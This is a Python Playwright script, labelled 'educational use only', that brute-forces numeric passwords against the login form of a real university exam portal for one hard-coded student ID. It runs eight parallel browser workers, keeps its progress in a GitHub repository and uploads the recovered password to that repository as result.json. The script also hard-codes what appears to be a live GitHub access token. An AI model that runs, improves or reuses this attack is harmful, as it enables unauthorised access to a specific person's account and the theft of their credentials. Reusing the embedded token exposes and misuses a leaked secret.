"""
=============================================================
  BRUTE FORCE + GITHUB CHECKPOINT
  EDUCATIONAL USE ONLY
=============================================================
"""

import json
import os
import time
import sys
import base64
import threading
import requests as req_lib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

# ── Config ────────────────────────────────────────────────────
TARGET_URL        = os.environ.get("TARGET_URL", "https://makaut1.ucanapply.com/smartexam/public/")
USERNAME          = os.environ.get("USERNAME",   "11900122027")
GITHUB_TOKEN      = os.environ.get("GITHUB_TOKEN", "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")
GITHUB_REPO       = os.environ.get("GITHUB_REPO", "abcdstore24-oss/My_Repo")
GITHUB_FILE       = "checkpoint.json"
NUM_WORKERS       = 8
DELAY             = 0.3
HEADLESS          = True
TOTAL_PINS        = 100_000_000
SAVE_EVERY        = 50

SUCCESS_BY_URL     = False
SUCCESS_BY_KEYWORD = True
SUCCESS_KEYWORD    = os.environ.get("SUCCESS_KEYWORD", "logout")

# ── Selectors ─────────────────────────────────────────────────
OPEN_MODAL_SELECTOR = "a[onclick*='openLoginPage(5)']"
USERNAME_SELECTOR   = "div.bootbox #username"
PASSWORD_SELECTOR   = "div.bootbox #password"

# ── Shared state ──────────────────────────────────────────────
found_event  = threading.Event()
found_result = {}
print_lock   = threading.Lock()

# ── GitHub checkpoint ─────────────────────────────────────────
def gh_headers():
    return {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept":        "application/vnd.github.v3+json"
    }

def github_load_checkpoint():
    if not GITHUB_TOKEN:
        print("  [GitHub] No token — starting from 0000.")
        return 0, None
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
        r   = req_lib.get(url, headers=gh_headers(), timeout=10)
        if r.status_code == 200:
            data    = r.json()
            content = json.loads(base64.b64decode(data["content"]).decode())
            sha     = data["sha"]
            resume  = int(content["last_pin"]) + 1
            print(f"  [GitHub] Checkpoint found → resuming from PIN {resume:04d}")
            return resume, sha
        elif r.status_code == 404:
            print("  [GitHub] No checkpoint yet → starting from 0000.")
        else:
            print(f"  [GitHub] Load failed: {r.status_code}")
    except Exception as e:
        print(f"  [GitHub] Load error: {e}")
    return 0, None

def github_save_checkpoint(pin_int, sha=None):
    if not GITHUB_TOKEN:
        return sha
    try:
        content = base64.b64encode(json.dumps({
            "last_pin":  pin_int,
            "timestamp": datetime.now().isoformat(),
            "username":  USERNAME,
            "target":    TARGET_URL,
        }).encode()).decode()
        payload = {
            "message": f"checkpoint {pin_int:04d}",
            "content": content,
        }
        if sha:
            payload["sha"] = sha
        url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
        r   = req_lib.put(url, headers=gh_headers(), json=payload, timeout=10)
        if r.status_code in (200, 201):
            return r.json()["content"]["sha"]
        else:
            print(f"\n  [GitHub] Save failed: {r.status_code}")
    except Exception as e:
        print(f"\n  [GitHub] Save error: {e}")
    return sha

def github_save_result(pin, sha=None):
    if not GITHUB_TOKEN:
        return
    try:
        content = base64.b64encode(json.dumps({
            "FOUND":     True,
            "username":  USERNAME,
            "password":  pin,
            "timestamp": datetime.now().isoformat(),
            "target":    TARGET_URL,
        }, indent=2).encode()).decode()
        url   = f"https://api.github.com/repos/{GITHUB_REPO}/contents/result.json"
        check = req_lib.get(url, headers=gh_headers(), timeout=10)
        body  = {"message": f"FOUND {pin}", "content": content}
        if check.status_code == 200:
            body["sha"] = check.json()["sha"]
        req_lib.put(url, headers=gh_headers(), json=body, timeout=10)
        print("\n  [GitHub] result.json saved to repo ✓")
    except Exception as e:
        print(f"\n  [GitHub] Result error: {e}")

# ── Success check ─────────────────────────────────────────────
def check_success(page) -> bool:
    try:
        if SUCCESS_BY_URL and "login" not in page.url:
            return True
        if SUCCESS_BY_KEYWORD:
            if SUCCESS_KEYWORD.lower() in page.inner_text("body").lower():
                return True
    except Exception:
        pass
    return False

# ── Browser alive ─────────────────────────────────────────────
def is_browser_alive(page) -> bool:
    try:
        _ = page.url
        return True
    except Exception:
        return False

# ── Modal open ────────────────────────────────────────────────
def open_modal(page, worker_id: int) -> bool:
    try:
        if TARGET_URL.rstrip("/") not in page.url:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
            page.wait_for_timeout(600)
        try:
            cancel = page.query_selector("div.bootbox.modal.in button[data-dismiss='modal']")
            if cancel and cancel.is_visible():
                cancel.click()
                page.wait_for_selector("div.bootbox.modal.in", state="hidden", timeout=3_000)
                page.wait_for_timeout(300)
        except Exception:
            pass
        page.wait_for_selector(OPEN_MODAL_SELECTOR, state="visible", timeout=5_000)
        page.click(OPEN_MODAL_SELECTOR)
        page.wait_for_selector("div.bootbox.modal.in", state="visible", timeout=6_000)
        page.wait_for_timeout(250)
        return True
    except PlaywrightTimeout:
        with print_lock:
            print(f"\n  [W{worker_id}] Timeout opening modal.")
        return False
    except Exception as e:
        with print_lock:
            print(f"\n  [W{worker_id}] Modal error: {e}")
        return False

# ── Worker ────────────────────────────────────────────────────
def worker(worker_id: int, chunk_start: int, chunk_end: int):
    start_from, sha = github_load_checkpoint()
    if start_from >= chunk_end:
        with print_lock:
            print(f"  [W{worker_id}] Already done, skipping.")
        return None

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=HEADLESS, slow_mo=0)
        page    = browser.new_page()
        try:
            page.goto(TARGET_URL, timeout=10_000)
            page.wait_for_load_state("domcontentloaded")
        except Exception as e:
            with print_lock:
                print(f"\n  [W{worker_id}] Page load error: {e}")
            browser.close()
            return None

        with print_lock:
            print(f"  [W{worker_id}] Page loaded. Starting...")

        attempts = 0
        last_pin = start_from

        try:
            for pin_int in range(start_from, chunk_end):
                if found_event.is_set():
                    break
                if not is_browser_alive(page):
                    with print_lock:
                        print(f"\n  [W{worker_id}] Browser closed, stopping.")
                    break

                pin      = f"{pin_int:04d}"
                attempts += 1
                last_pin  = pin_int

                # Save checkpoint every 50 pins
                if attempts % SAVE_EVERY == 0:
                    sha = github_save_checkpoint(pin_int, sha)

                with print_lock:
                    print(
                        f"  [W{worker_id}] PIN {pin}  "
                        f"({pin_int - chunk_start + 1}/{chunk_end - chunk_start})",
                        end="\r"
                    )

                try:
                    if not open_modal(page, worker_id):
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                        if not open_modal(page, worker_id):
                            continue

                    page.fill(USERNAME_SELECTOR, "")
                    page.fill(USERNAME_SELECTOR, USERNAME)
                    page.fill(PASSWORD_SELECTOR, "")
                    page.fill(PASSWORD_SELECTOR, pin)
                    page.evaluate("postLogin()")
                    page.wait_for_timeout(1_500)

                    if check_success(page):
                        found_event.set()
                        found_result["pin"]       = pin
                        found_result["worker_id"] = worker_id
                        sha = github_save_checkpoint(pin_int, sha)
                        github_save_result(pin, sha)
                        with print_lock:
                            print(f"\n\n  [W{worker_id}] ✓ FOUND! PIN = {pin}")
                        browser.close()
                        return pin

                except PlaywrightTimeout:
                    if not is_browser_alive(page):
                        break
                    try:
                        page.goto(TARGET_URL, timeout=10_000)
                        page.wait_for_load_state("domcontentloaded")
                    except Exception:
                        break
                    continue
                except Exception as e:
                    if not is_browser_alive(page):
                        break
                    with print_lock:
                        print(f"\n  [W{worker_id}] Error ({pin}): {e}")
                    continue

                if DELAY > 0:
                    time.sleep(DELAY)

        except KeyboardInterrupt:
            sha = github_save_checkpoint(last_pin, sha)
            with print_lock:
                print(f"\n  [W{worker_id}] Saved at {last_pin:04d}")

        finally:
            try:
                browser.close()
            except Exception:
                pass

    return None

# ── Main ──────────────────────────────────────────────────────
def split_chunks(total, n):
    size = total // n
    return [(i * size, (i + 1) * size if i < n - 1 else total) for i in range(n)]

def run():
    print()
    print("=" * 58)
    print("  BRUTE FORCE — Render + GitHub Checkpoint")
    print("=" * 58)
    print(f"  Target   : {TARGET_URL}")
    print(f"  Username : {USERNAME}")
    print(f"  Range    : 0000 – {TOTAL_PINS-1:04d}")
    print(f"  Started  : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 58)

    chunks = split_chunks(TOTAL_PINS, NUM_WORKERS)

    start_ts = time.time()
    try:
        with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
            futures = {
                executor.submit(worker, i + 1, chunks[i][0], chunks[i][1]): i + 1
                for i in range(NUM_WORKERS)
            }
            for future in as_completed(futures):
                future.result()
    except KeyboardInterrupt:
        found_event.set()
        time.sleep(1)
        sys.exit(0)

    elapsed = time.time() - start_ts
    if "pin" in found_result:
        print(f"\n{'='*58}")
        print(f"  PASSWORD FOUND!")
        print(f"  Username : {USERNAME}")
        print(f"  Password : {found_result['pin']}")
        print(f"  Time     : {elapsed:.1f}s")
        print(f"{'='*58}\n")
    else:
        print(f"\n  Not found. Checkpoint saved — redeploy to continue.")
    print(f"  Total time : {elapsed:.1f}s\n")

if __name__ == "__main__":
    run()
